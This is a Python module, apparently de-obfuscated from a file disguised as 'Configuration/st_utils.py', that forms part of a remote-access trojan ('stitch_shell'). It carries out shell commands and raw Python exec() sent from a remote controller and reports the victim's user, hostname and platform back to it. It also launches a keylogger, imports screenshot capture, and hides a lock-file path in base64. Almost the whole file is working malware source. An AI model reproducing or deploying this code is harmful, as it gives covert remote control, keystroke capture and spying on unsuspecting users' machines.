#!/usr/bin/env python3
# Decoded from Configuration/st_utils.py
# Original was obfuscated with exec(SEC(INFO(...)))


import os
import re
import sys
import math
import socket
import base64
import shutil
import zipfile
import datetime
import requests
from io import StringIO
import platform
import threading
import subprocess
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from st_protocol import *
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from st_encryption import *
from mss import ScreenshotError
from time import strftime, sleep
from contextlib import contextmanager

import pexpect
import pyxhook
import pexpect.pxssh
from mss.linux import MSS
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from st_lnx_keylogger import *



sp = subprocess
N = True
T = False
D = send
Q = sys.platform

def run_command(GTVX):
    subp = sp.Popen(GTVX,shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    NWA, YPNP = subp.communicate()
    if not YPNP:
        if NWA == '':
            return "[+] Command successfully executed.\n"
        else:
            return NWA
    return "[!] {}".format(YPNP)

def start_command(command):
    try:
        subp = sp.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\n'
    except Exception as e:
        return '[!] {}\n'.format(str(e))

def no_error(LQQ):
    if LQQ.startswith("ERROR:") or LQQ.startswith("[!]") :
        return T
    else:
        return N

def win_client(system = Q):
    if system.startswith('win'):
        return N
    else:
        return T

def osx_client(system = Q):
    if system.startswith('darwin'):
        return N
    else:
        return T

def lnx_client(system = Q):
    if system.startswith('linux'):
        return N
    else:
        return T

def pyexec(DC,client_socket,pylib=False):
    pyerror = None
    response = ''
    if pylib:
        try:
            exec(DC)
        except Exception as e:
            YPNP = "[!] PYEXEC(): {}".format(str(e))
            D(client_socket,YPNP)
    else:
        with stdoutIO() as s:
            try:
                exec(DC)
            except Exception as e:
                YPNP = "[!] PYEXEC(): {}".format(str(e))
                D(client_socket,YPNP)
        r = s.getvalue()
        D(client_socket,r)

def determine_cmd(GTVX,YGI):
    if GTVX.strip()[:6] == "pyexec":
        pyexec(GTVX.strip()[6:],YGI)
    elif GTVX.strip()[:5] == "pylib":
        pyexec(GTVX.strip()[5:],YGI,pylib=True)
    else:
        output=run_command(GTVX)
        D(YGI,output)

def get_user():
    if win_client():
        user = os.getenv('username')
    else:
        user = run_command('whoami')
    return user.strip()

def get_path():
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    path_name = "[{}@{}] {}>".format(user,hostname,current_dir)
    return path_name

def get_temp():
    if win_client():
        temp = "C:\\Windows\\Temp\\"
    else:
        temp = "/tmp/"
    return temp

def get_desktop():
    user = get_user()
    if win_client():
        DTVI = os.path.join(os.getenv('userprofile'),'Desktop')
    elif osx_client():
        DTVI = '/Users/{}/Desktop'.format(user)
        if not os.path.exists(DTVI):
            logname = run_command('logname')
            DTVI = '/Users/{}/Desktop'.format(logname.strip())
    else:
        DTVI = '/home/{}'.format(user)
    return DTVI

def stitch_running():
    R = os.getpid()
    DTVI = os.path.abspath(sys.argv[0])
    if DTVI.endswith('.py') or DTVI.endswith('.pyc'):
        DTVI = 'python.exe'
    if win_client():
        DC = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
    else:
        DC = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
    if os.path.exists(DC):
        with open(DC,'r') as st:
            data = st.readlines()
            data[0] = str(data[0]).strip()
        if data[0] == R:
            if data[1] == DTVI:
                return True
        if win_client():
            exists_cmd = 'wmic process where "ProcessID={}" get ExecutablePath'.format(data[0])
        else:
            exists_cmd = 'ps -p {} -o comm='.format(data[0])
        running = run_command(exists_cmd)
        if running:
            if data[1] in running.strip() or running.strip() in data[1]:
                return True
    with open(DC,'w') as st:
        st.write('{}\n{}'.format(R,DTVI))
    return False

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

@contextmanager
def stdoutIO(stdout=None):
    prev = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = prev

def client_handler(YGI):
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    R = get_desktop()
    if os.path.exists(R):
        os.chdir(R)
    try:
        D(YGI,'c3RpdGNoX3NoZWxs',encryption=False)
        D(YGI,abbrev, encryption=False)
        D(YGI,Q)
        D(YGI,Q)
        D(YGI,user)
        D(YGI,hostname)
        D(YGI,platform.platform())
        cmd_buffer=""
        while N:
            cmd_buffer = receive(YGI)
            if not cmd_buffer: break
            if cmd_buffer == "end_connection": break
            determine_cmd(str(cmd_buffer),YGI)
        YGI.close()
    except Exception:
        if dbg:
            print(e)
        YGI.close()

dbg = False
nt_kl = keylogger()
script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))

